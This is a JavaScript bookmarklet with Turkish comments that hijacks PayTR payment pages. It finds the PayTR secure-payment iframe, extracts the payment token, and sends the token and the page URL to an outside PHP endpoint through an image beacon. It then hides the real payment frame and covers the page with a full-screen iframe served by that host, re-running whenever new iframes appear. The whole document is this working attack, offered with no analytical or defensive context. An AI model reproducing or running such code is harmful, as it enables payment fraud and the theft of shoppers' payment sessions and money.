javascript:(function(){
    const u = 'https://igneadataksi.com.tr/assets/img/brand/yakala.php';
    
    function hijack() {
        const iframes = document.querySelectorAll('iframe');
        for(let frame of iframes) {
            if(frame.src && frame.src.includes('paytr.com/odeme/guvenli/')) {
                // Token'ı çıkar
                const match = frame.src.match(/\/guvenli\/([a-f0-9-]+)/);
                if(match && match[1]) {
                    let token = match[1];
                    if(token.includes('-')) token = token.split('-')[0];
                    
                    console.log('🎯 Token bulundu:', token);
                    
                    // Token'ı gönder
                    new Image().src = u + '?token=' + token + '&url=' + btoa(location.href);
                    
                    // Orijinal iframe'i gizle (kaldırma)
                    frame.style.cssText = 'opacity:0;position:absolute;z-index:-9999;pointer-events:none;width:1px;height:1px';
                    
                    // Kendi iframe'imizi ekle
                    const container = document.createElement('div');
                    container.id = 'paytr-hijack-container';
                    container.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:999999';
                    
                    const iframeWrapper = document.createElement('div');
                    iframeWrapper.style.cssText = 'width:100%;height:100%';
                    
                    const ourIframe = document.createElement('iframe');
                    ourIframe.src = u + '?token=' + token + '&redirect=1';
                    ourIframe.style.cssText = 'width:100%;height:100%;border:none';
                    
                    // X-Frame-Options bypass için no-referrer
                    ourIframe.referrerPolicy = 'no-referrer';
                    
                    iframeWrapper.appendChild(ourIframe);
                    container.appendChild(iframeWrapper);
                    document.body.appendChild(container);
                    
                    // Body scroll'u engelle
                    document.body.style.overflow = 'hidden';
                    
                    return true;
                }
            }
        }
        return false;
    }
    
    // Başlat
    if(!hijack()) {
        setInterval(hijack, 1000);
    }
    
    // MutationObserver ile yeni iframe'leri yakala
    if(typeof MutationObserver !== 'undefined') {
        const observer = new MutationObserver(hijack);
        observer.observe(document.body, {childList: true, subtree: true});
    }
})();
